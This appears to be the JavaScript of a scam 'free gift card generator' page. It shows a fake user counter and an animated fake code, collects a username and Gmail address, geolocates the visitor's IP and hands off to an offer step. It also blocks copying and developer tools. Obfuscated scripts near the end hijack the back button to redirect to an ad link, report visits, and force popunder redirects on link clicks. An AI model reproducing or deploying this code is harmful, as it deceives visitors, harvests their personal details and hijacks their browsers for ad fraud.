var myVar2 = setInterval(UserTimer, 9000);
function UserTimer() {
document.getElementById("user-online").innerHTML=Math.floor(Math.random() * 100)+200;
}

var date = (new Date()).toString().split(' ').splice(1,3).join(' ');
document.getElementById("update").innerHTML =date;

$(document).ready(function() {
    $('body').css({
        '-webkit-user-select': 'none',
        '-moz-user-select': 'none',
        '-ms-user-select': 'none',
        'user-select': 'none'
    });

    $(document).on('contextmenu', function(e) { e.preventDefault(); });
    $(document).on('copy cut paste', function(e) { e.preventDefault(); });
    $('img').on('dragstart', function(e) { e.preventDefault(); });

    $(document).keydown(function(e) {
        if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 83 || e.keyCode === 117)) return false;
        if (e.keyCode === 123) return false;
    });

    var isGenerating = false;
    var currentBaseCode = "";

    function generateRandom(length) {
        var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        var res = "";
        for (var i = 0; i < length; i++) res += chars.charAt(Math.floor(Math.random() * chars.length));
        return res;
    }

    function getDeviceInfo() {
        var ua = navigator.userAgent;
        if (/mobile/i.test(ua)) return "Mobile Device";
        if (/iPad|Android|Touch/i.test(ua)) return "Tablet Device";
        return "Desktop PC";
    }

    $('.custom-card').on('click', function() {
        var imgSrc = $(this).find('.card-img').attr('src');
        $('#popupImage').attr('src', imgSrc);
        
        currentBaseCode = generateRandom(4) + '-' + generateRandom(4) + '-' + generateRandom(4);
        
        $('#usernameInput').val('');
        $('#emailInput').val('');
        $('#inputError').hide();
        $('#initialStep').show();
        $('#generatorArea').hide();
        $('#verificationText').hide();
        $('#codeDisplay').text(currentBaseCode + '-####').css('color', '#00e5ff');
        $('#mainBtn').text('GET NOW').show();
        isGenerating = false;
        
        $('#giftModal').modal('show');
    });

    $('#mainBtn').on('click', function() {
        if (!isGenerating && $(this).text() === 'GET NOW') {
            var userVal = $('#usernameInput').val().trim();
            var emailVal = $('#emailInput').val().trim().toLowerCase();

            if (userVal === "" || !emailVal.endsWith("@gmail.com")) {
                $('#inputError').slideDown('fast');
                return;
            }
            
            $('#inputError').hide();
            isGenerating = true;
            
            $('#displayUser').text(userVal);
            $('#displayEmail').text(emailVal);
            $('#displayDevice').text(getDeviceInfo());

            $.get("https://get.geojs.io/v1/ip/geo.json", function(response) {
                if(response && response.city && response.country) {
                    $('#displayLocation').text(response.city + ", " + response.country);
                } else {
                    $('#displayLocation').text("Location detected");
                }
            }).fail(function() {
                $('#displayLocation').text("Location secured");
            });

            $('#initialStep').hide();
            $('#generatorArea').show();
            $(this).hide();

            var count = 0;
            var interval = setInterval(function() {
                var animateCode = generateRandom(4) + '-' + generateRandom(4) + '-' + generateRandom(4) + '-' + generateRandom(4);
                $('#codeDisplay').text(animateCode).css('color', '#f1c40f');
                count++;

                if (count > 50) {
                    clearInterval(interval);
                    $('#codeDisplay').text(currentBaseCode + '-####').css('color', '#ffffff');
                    $('#verificationText').fadeIn();
                    $('#mainBtn').text('VERIFY NOW').fadeIn();
                }
            }, 50);
        } else if ($(this).text() === 'VERIFY NOW') {
            _OS();
        }
    });
});

async function loadImages() {
    
    const notFoundPlaceholder = "data:image/svg+xml;charset=UTF-8,%3Csvg width='150' height='150' xmlns='http://www.w3.org/2000/svg'%3E%3Crect width='100%' height='100%' fill='%23ddd'/%3E%3Ctext x='50%' y='50%' font-size='40' text-anchor='middle' alignment-baseline='middle' fill='%23888'%3E?%3C/text%3E%3C/svg%3E";

    
    const allImages = document.querySelectorAll('img[id^="img"]');

    
    allImages.forEach(img => {
        
        if (!img.getAttribute('src') || img.getAttribute('src') === "") {
            img.src = notFoundPlaceholder;
        }
    });

    try {
        const response = await fetch('https://raw.githack.com/hyein89/freegiftcardcc/main/images.json');
        
        
        if (!response.ok) {
            console.error("Gagal mengambil data images.json");
            return; 
        }

        const data = await response.json();
        
        
        const updatedIds = [];

        
        data.forEach(item => {
            const imgElement = document.getElementById(item.id);
            if (imgElement) {
                imgElement.src = item.base64;
                updatedIds.push(item.id);
            }
        });

        

    } catch (error) {
        
        console.error("Error dalam proses loadImages:", error);
    }
}


var hit = {ver: '1.0'};
!function(config){let self=this;self.agent=false;self.mobile=navigator.userAgent.match(/Android|Mobile|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WebOS|Windows Phone/i)!==null;self.mobile=false;self.clicked=false;!function(d,l,h){var m='#!/back';var loc=l.pathname+l.search;for(var i=0;i<10;i++){h.pushState(null,d.title,loc+m);}
h.replaceState(null,d.title,loc);const pop=function(e){if(l.hash==m&&self.agent===false){h.replaceState(null,d.title,loc);setTimeout(function(){window.location.href=config.link;},1);}};window.addEventListener('popstate',pop);}(document,window.location,history);!function(data){let self=this;if(typeof data!='object'){return;}
self.data=data;self.data.r=document.referrer;self.data.u=document.location.href;let req=new XMLHttpRequest();req.onload=function(){if(req.status!=200){return;}
try{let data=JSON.parse(req.responseText);}catch(e){}}
const save=function(start,url){let data=JSON.parse(JSON.stringify(self.data));req.open('POST',config.hit,true);req.timeout=3000;req.setRequestHeader('Content-Type','application/json');req.send(JSON.stringify(data));};const mouse=function(event){if(self.mobile===true){}}
const click=function(event){let node=event.target.nodeName;if(node!=='A'){return;}}
let links=[].slice.call(document.querySelectorAll("a"));links.forEach(function(link){if(link.childElementCount==0){return;}
link.addEventListener('mouseleave',mouse);});document.addEventListener('click',click);setTimeout(function(){save(true);},20);}(typeof hit=='object'&&hit);}({link:"https://hatsharmonyarab.com/haba8g98r5?key=c62a925a76460616caf39679e0e121a9",hit:"/hit"});
(function(adConfig){var popMagic={version:"1.0.0-",cookie_name:"splash42",url:"",config:{},open_count:0,top:null,browser:null,configTpl:{link:"",overlay:0,frequency_period:1,frequency_count:1,trigger_method:2},init:function(config){for(var key in this.configTpl){if(!this.configTpl.hasOwnProperty(key)){continue;}
if(typeof config[key]!=="undefined"){this.config[key]=config[key];}else{this.config[key]=this.configTpl[key];}}
popMagic.config.frequency_count=parseInt(popMagic.config.frequency_count);this.preparePop();},getCountFromCookie:function(){var shownCookie=popMagic.getCookie(popMagic.cookie_name);var ctr=typeof shownCookie==="undefined"?0:parseInt(shownCookie);if(isNaN(ctr)){ctr=0;}
return ctr;},shouldShow:function(){if(popMagic.open_count>=popMagic.config.frequency_count){return false;}
var ctr=popMagic.getCountFromCookie();popMagic.open_count=ctr;return!(ctr>=popMagic.config.frequency_count);},setAsOpened:function(){var new_ctr=1;if(popMagic.open_count!==0){new_ctr=popMagic.open_count+1;}else{new_ctr=popMagic.getCountFromCookie()+1;}
popMagic.setCookie(popMagic.cookie_name,new_ctr,popMagic.config.frequency_period);},preparePop:function(){popMagic.top=self;if(popMagic.top!==self){try{if(top.document.location.toString()){popMagic.top=top;}}catch(err){}}
popMagic.buildUrl();popMagic.browser=popMagic.browserDetector.detectBrowser(navigator.userAgent);var popMethod=popMagic.getPopMethod(popMagic.browser);popMagic.addEvent("click",popMethod);if(popMagic.shouldShow()&&this.config.overlay>0)popMagic.createOverlay();},createOverlay:function(){var play=document.querySelector(".player-container");if(!play)return;var o=document.createElement("div");o.style.position="absolute";o.style.top="0";o.style.left="0";o.style.width="100%";o.style.height="100%";o.style.backgroundColor="rgba(0, 0, 0, 0)";o.style.cursor="pointer";o.style.zIndex="9999";o.addEventListener("click",function(event){event.stopPropagation();o.remove();popMagic.setAsOpened();window.open(popMagic.url+"/over","_blank");});var body=document.querySelector("body")
var closeOverlay=function(event){event.stopPropagation();o.remove();body.removeEventListener("click",closeOverlay);};body.addEventListener("click",closeOverlay);play.appendChild(o);},getPopMethod:function(browserInfo){if(browserInfo.isMobile){return popMagic.methods.default;}
if(browserInfo.name==="chrome"){return popMagic.methods.chromeTab;}
return popMagic.methods.default;},buildUrl:function(){this.url=this.config.link;},addEventToElement:function(obj,type,fn){if(obj.addEventListener){obj.addEventListener(type,fn,false);}else if(obj.attachEvent){obj["e"+type+fn]=fn;obj[type+fn]=function(){obj["e"+type+fn](window.event);};obj.attachEvent("on"+type,obj[type+fn]);}else{obj["on"+type]=obj["e"+type+fn];}},addEvent:function(type,fn){var targetElements;if(popMagic.config.trigger_method=="1"){targetElements=document.querySelectorAll("a");for(i=0;i<targetElements.length;i++){popMagic.addEventToElement(targetElements[i],type,fn);}
return;}
if(popMagic.config.trigger_method=="2"){targetElements=document.querySelectorAll("a");for(var i=0;i<targetElements.length;i++){var imgs=targetElements[i].getElementsByTagName("img");if(imgs.length>0){for(var j=0;j<imgs.length;j++){if(imgs[j].src.indexOf("logo")==-1&&imgs[j].src.indexOf("data:")==-1){popMagic.addEventToElement(targetElements[i],type,fn);}}}}
return;}
popMagic.addEventToElement(document,type,fn);},setCookie:function(name,value,ttl_minutes){var date=new Date();date.setTime(date.getTime()+ttl_minutes*60*1000);document.cookie=name+"="+encodeURIComponent(value)+";expires="+date.toUTCString()+";path=/";},getCookie:function(name){var i,x,y,cookiesArray=document.cookie.split(";");for(i=0;i<cookiesArray.length;i++){x=cookiesArray[i].substr(0,cookiesArray[i].indexOf("="));y=cookiesArray[i].substr(cookiesArray[i].indexOf("=")+1);x=x.replace(/^\s+|\s+$/g,"");if(x===name){return decodeURIComponent(y);}}},randStr:function(length,possibleChars){var text="";var possible=possibleChars||"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";for(var i=0;i<length;i++){text+=possible.charAt(Math.floor(Math.random()*possible.length));}
return text;},isValidUserEvent:function(event){if("isTrusted"in event&&event.isTrusted&&popMagic.browser.name!=="ie"&&popMagic.browser.name!=="safari"){return true;}else{return event.screenX!=0&&event.screenY!=0;}},isValidHref:function(href){if(typeof href==="undefined"||href==""){return false;}
var empty_ref=/\s?javascript\s?:/i;return!empty_ref.test(href);},findLinkToOpen:function(clickedElement){var target=clickedElement;var location=false;try{var breakCtr=0;while(breakCtr<20&&!target.getAttribute("href")&&target!==document&&target.nodeName.toLowerCase()!=="html"){target=target.parentNode;breakCtr++;}
location=target.getAttribute("href");}catch(err){}
if(!popMagic.isValidHref(location)){location=false;}
return location||window.location.href;},browserDetector:{browserDefinitions:[["firefox",/Firefox\/([0-9.]+)(?:\s|$)/],["opera",/Opera\/([0-9.]+)(?:\s|$)/],["opera",/OPR\/([0-9.]+)(:?\s|$)$/],["edge",/Edge\/([0-9._]+)/],["ie",/Trident\/7\.0.*rv:([0-9.]+)\).*Gecko$/],["ie",/MSIE\s([0-9.]+);.*Trident\/[4-7].0/],["ie",/MSIE\s(7\.0)/],["safari",/Version\/([0-9._]+).*Safari/],["chrome",/(?!Chrom.*OPR)Chrom(?:e|ium)\/([0-9.]+)(:?\s|$)/],["bb10",/BB10;\sTouch.*Version\/([0-9.]+)/],["android",/Android\s([0-9.]+)/],["ios",/Version\/([0-9._]+).*Mobile.*Safari.*/],["yandexbrowser",/YaBrowser\/([0-9._]+)/],["crios",/CriOS\/([0-9.]+)(:?\s|$)/],],detectBrowser:function(userAgent){var isMobile=userAgent.match(/Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WebOS|Windows Phone/i);for(var i in this.browserDefinitions){var definition=this.browserDefinitions[i];if(definition[1].test(userAgent)){var match=definition[1].exec(userAgent);var version=match&&match[1].split(/[._]/).slice(0,3);var versionTails=Array.prototype.slice.call(version,1).join("")||"0";if(version&&version.length<3){Array.prototype.push.apply(version,version.length===1?[0,0]:[0]);}
return{name:definition[0],version:version.join("."),versionNumber:parseFloat(version[0]+"."+versionTails),isMobile:isMobile};}}
return{name:"other",version:"1.0",versionNumber:1,isMobile:isMobile};},},methods:{default:function(triggeredEvent){if(!popMagic.shouldShow()||!popMagic.isValidUserEvent(triggeredEvent))return true;var clickedElement=triggeredEvent.target||triggeredEvent.srcElement;var href=popMagic.findLinkToOpen(clickedElement);window.open(href,"_blank");popMagic.setAsOpened();popMagic.top.document.location=popMagic.url;if(typeof triggeredEvent.preventDefault!=="undefined"){triggeredEvent.preventDefault();triggeredEvent.stopPropagation();}
return true;},chromeTab:function(event){if(!popMagic.shouldShow()||!popMagic.isValidUserEvent(event))return true;if(typeof event.preventDefault!=="undefined"){event.preventDefault();event.stopPropagation();}else{return true;}
var a=top.window.document.createElement("a");var target=event.target||event.srcElement;a.href=popMagic.findLinkToOpen(target);document.getElementsByTagName("body")[0].appendChild(a);var e=new MouseEvent("click",{bubbles:true,cancelable:true,view:window,screenX:0,screenY:0,clientX:0,clientY:0,ctrlKey:true,altKey:false,shiftKey:false,metaKey:true,button:0});e.preventDefault=undefined;a.dispatchEvent(e);a.parentNode.removeChild(a);window.open(popMagic.url,"_self");popMagic.setAsOpened();},},};popMagic.init(adConfig);})({link:"https://hatsharmonyarab.com/haba8g98r5?key=c62a925a76460616caf39679e0e121a9",overlay:"1"});
function load(type, href, call) {
var link;if (type == 'css') {link = document.createElement("link");link.href = href;link.type = "text/css";link.rel = "stylesheet";link.async = true;} else {
link = document.createElement("script");link.type = "text/javascript";link.src = href;link.defer = true;link.async = true;}
if (typeof call !== 'undefined') {link.onload = call;}document.getElementsByTagName("head")[0].appendChild( link );}
document.addEventListener('DOMContentLoaded', loadImages);